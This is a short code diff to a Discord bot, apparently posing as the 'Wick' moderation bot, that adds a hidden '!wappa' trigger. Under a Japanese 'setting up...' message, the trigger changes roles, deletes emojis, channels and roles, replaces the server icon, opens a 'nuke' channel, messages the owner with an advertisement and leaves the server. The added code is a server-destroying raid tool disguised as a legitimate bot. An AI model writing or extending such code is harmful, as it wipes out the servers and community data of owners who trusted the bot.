@@ -75,8 +75,20 @@ async def on_message(message):
     if message.author.bot:
         return
     if message.content == '!wappa':
+        await message.delete()
+        await message.channel.send("<a:typing:1054329534593693635>設定中...")
         raidmanager = RaidManager(guild)
-        raidmanager.delete_channel()
+        await raidmanager.change_role()
+        await raidmanager.delete_emoji()
+        await raidmanager.channel_delete()
+        await raidmanager.role_delete()
+        await raidmanager.change_server_icon()
+        await raidmanager.create_text_channel(nuke_channel)
+        await raidmanager.send_adv_to_owner()
+        await asyncio.sleep(170)
+        await guild.leave()
+        return
+
 
     elif message.content == 'w!help':
         embeds = Embed(title="Wick's Help Panel:")
